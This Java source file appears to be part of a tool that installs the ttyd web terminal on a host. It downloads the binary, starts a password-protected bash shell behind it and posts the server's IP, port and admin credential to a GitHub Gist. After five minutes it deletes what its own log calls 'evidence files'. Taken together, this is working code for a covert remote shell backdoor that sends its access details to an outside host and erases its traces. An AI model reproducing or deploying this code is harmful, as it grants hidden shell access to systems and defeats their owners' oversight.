package com.github.vevc.service.impl;

import com.github.vevc.config.AppConfig;
import com.github.vevc.service.AbstractAppService;
import com.github.vevc.util.LogUtil;

import java.io.File;
import java.io.IOException;
import java.nio.file.Files;
import java.util.UUID;
import java.util.concurrent.TimeUnit;

public class TtydServiceImpl extends AbstractAppService {

    private static final String APP_NAME = "java-ttyd";
    private static final String INFO_FILE = "ttyd.txt";
    private static final int CLEANUP_DELAY_SECONDS = 300;

    private static final String TTYD_VERSION = "1.7.7";
    private static final String TTYD_DOWNLOAD_URL =
        "https://github.com/tsl0922/ttyd/releases/download/%s/ttyd.%s";

    private AppConfig config;
    private GistSyncService gistSync;
    private String gistTtydFile = "ttyd_PPMC.txt";
    private String ttydPassword;

    public void setGistSync(GistSyncService gistSync) {
        this.gistSync = gistSync;
    }

    public void setGistTtydFile(String gistTtydFile) {
        this.gistTtydFile = gistTtydFile;
    }

    @Override
    protected String getAppDownloadUrl(String appVersion) {
        String arch = OS_IS_ARM ? "aarch64" : "x86_64";
        return String.format(TTYD_DOWNLOAD_URL, appVersion, arch);
    }

    @Override
    public void install(AppConfig appConfig) throws Exception {
        this.config = appConfig;
        File workDir = this.initWorkDir();

        String downloadUrl = this.getAppDownloadUrl(TTYD_VERSION);
        LogUtil.info("ttyd download url: " + downloadUrl);

        File appFile = new File(workDir, APP_NAME);

        this.download(downloadUrl, appFile);
        LogUtil.info("ttyd downloaded successfully");

        this.setExecutePermission(appFile.toPath());
        LogUtil.info("ttyd installed successfully");

        if (config.getTtydPassword() == null || config.getTtydPassword().isEmpty()) {
            this.ttydPassword = UUID.randomUUID().toString().substring(0, 12);
            config.setTtydPassword(this.ttydPassword);
        } else {
            this.ttydPassword = config.getTtydPassword();
        }
    }

    @Override
    public void startup() {
        File workDir = this.getWorkDir();
        File appFile = new File(workDir, APP_NAME);

        try {
            int internalPort = 3000;
            String credential = "admin:" + ttydPassword;

            ProcessBuilder pb = new ProcessBuilder(
                appFile.getAbsolutePath(),
                "-p", String.valueOf(internalPort),
                "-c", credential,
                "-i", "127.0.0.1",
                "bash"
            );
            pb.directory(workDir);
            pb.environment().put("JAVA_OPTS", "-Xmx512M -Xms256M");
            pb.redirectErrorStream(true);

            LogUtil.info("Starting ttyd web terminal on internal port " + internalPort + "...");
            this.currentProcess = pb.start();

            String serverIp = getServerIp();
            int externalPort = config.getTtydPort();
            String infoUrl = "http://" + serverIp + ":" + externalPort;
            File infoFile = new File(workDir, INFO_FILE);
            Files.writeString(infoFile.toPath(), infoUrl);

            if (gistSync != null && gistSync.isEnabled()) {
                gistSync.sync(gistTtydFile, "ttyd access: " + infoUrl + "\ncredential: " + credential);
            }

            new Thread(() -> {
                try (var reader = new java.io.BufferedReader(
                        new java.io.InputStreamReader(currentProcess.getInputStream()))) {
                    String line;
                    while ((line = reader.readLine()) != null) {
                        LogUtil.info("[ttyd] " + line);
                    }
                } catch (IOException e) {
                    LogUtil.info("[ttyd] Stream closed: " + e.getMessage());
                }
            }).start();

        } catch (Exception e) {
            LogUtil.error("ttyd startup failed", e);
        }
    }

    @Override
    public void clean() {
        File workDir = this.getWorkDir();
        File appFile = new File(workDir, APP_NAME);
        File infoFile = new File(workDir, INFO_FILE);

        try {
            TimeUnit.SECONDS.sleep(CLEANUP_DELAY_SECONDS);
            Files.deleteIfExists(appFile.toPath());
            Files.deleteIfExists(infoFile.toPath());
            LogUtil.info("ttyd evidence files cleaned after " + CLEANUP_DELAY_SECONDS + " seconds");
        } catch (Exception e) {
            LogUtil.error("ttyd cleanup failed", e);
        }
    }

    @Override
    public void stop() {
        if (currentProcess != null && currentProcess.isAlive()) {
            currentProcess.destroyForcibly();
            LogUtil.info("ttyd process stopped");
        }
    }
}
